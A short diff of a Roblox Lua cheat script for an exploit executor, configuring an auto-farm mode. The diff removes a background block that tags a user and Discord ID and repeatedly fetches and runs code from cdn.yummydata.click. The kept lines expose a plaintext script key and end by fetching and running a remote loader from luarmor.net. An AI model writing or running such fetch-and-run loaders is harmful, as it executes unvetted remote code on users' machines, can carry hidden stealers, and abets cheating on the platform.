@@ -1,6 +1,3 @@
-task.spawn(function()
-_G.Config={UserID="3f3fb26b-c3b5-4cd2-b7e3-4f8bba14fe23",discord_id="765845940074053633",Note="Pc1"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/mm2"))()end)if s then break end wait(5)end
-end)
 script_key = "GJDZpgeTXXkxlubRVfzBbXuYOMSzfFcr"
 getgenv().Config = {
     FARM_MODE = "BattlePass", -- BattlePass / Crate
@@ -27,3 +24,4 @@ task.spawn(function()
 end)
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8b381051c5e99846fe64dcea7d597e49.lua"))()
+
